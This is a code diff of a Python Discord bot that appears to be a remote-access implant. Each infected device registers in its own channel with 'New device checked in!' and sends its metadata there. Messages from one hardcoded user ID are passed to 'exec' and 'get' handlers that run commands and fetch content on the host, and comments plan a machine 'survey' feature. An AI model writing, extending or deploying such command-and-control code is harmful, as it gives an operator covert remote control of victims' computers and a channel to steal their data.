@@ -137,6 +137,10 @@ def process_command(cmd_str):
     cmd = parts[0].lower()
     arg = parts[1] if len(parts) > 1 else None
 
+    # TODO: more commands
+    # Make cd a built-in
+    # Make ls / lt aliases for python dirlist
+    # Make a 'survey' option which bundles commands
     commands = {
         "exec": execute_command,
         "get": get_content
@@ -232,7 +236,11 @@ async def on_ready():
         if not existing:
             new_channel = await guild.create_text_channel(channel_name)
             await new_channel.send("📡 New device checked in!")
+
+            # Trying with new send_long_message
             await send_long_message(new_channel, metadata_pretty, prefix=JSON_FORMAT_PREFIX)
+            
+            # await new_channel.send(metadata_pretty)
 
             CHECKIN_CHANNELS.add(channel_name)
             LOCKFILE.write_text(str(channel_name), encoding="utf-8")
@@ -255,7 +263,9 @@ async def on_message(message):
 
     if(message.author.id == 558898662772572160):
         output = process_command(message.content)
-        await message.channel.send(output)
+        # await message.channel.send(output)
+
+        await send_long_message(message.channel, output)
 
 if __name__ == "__main__":
     main()
